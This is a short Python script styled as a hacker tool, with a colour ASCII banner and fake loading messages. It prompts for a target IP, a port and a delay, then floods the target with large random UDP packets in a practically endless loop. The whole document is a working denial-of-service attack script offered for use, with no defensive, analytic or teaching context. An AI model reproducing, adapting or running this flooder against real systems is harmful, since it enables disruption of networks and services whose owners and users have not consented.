from pystyle import Colors, Colorate
import time
import socket, random, time
print(Colorate.Horizontal(Colors.red_to_yellow,""" 
                                                _____         _           _____ ___   
                                                |  |  |___ ___| |_ ___ ___|  |  |_  |  
                                                |     | .'|  _| '_| -_|  _|  |  |_| |_ 
                                                |__|__|__,|___|_,_|___|_|  \___/|_____|
                                                Welcome !
""",1))
time.sleep(0.8)
print("Loading... 10/")
time.sleep(0.2)
print("Loading... 40/")
time.sleep(0.4)
print("Loading... 70/")
time.sleep(0.1)
print("Loading... 100/")
s = socket.socket(socket.AF_INET, socket .SOCK_DGRAM)

 

ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100**1000):
	s.send(random._urandom(10)*1000)
	print(f"Send: {i}", end ='\r')
	time.sleep(sleep)